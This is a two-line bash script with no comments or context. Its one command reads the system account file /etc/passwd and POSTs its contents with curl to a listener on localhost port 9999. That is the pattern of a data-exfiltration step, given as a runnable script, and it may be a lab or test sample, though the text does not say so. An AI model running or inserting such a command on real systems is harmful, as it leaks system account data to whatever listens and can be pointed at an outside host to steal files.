#!/bin/bash

cat /etc/passwd | curl -X POST -d @- localhost:9999
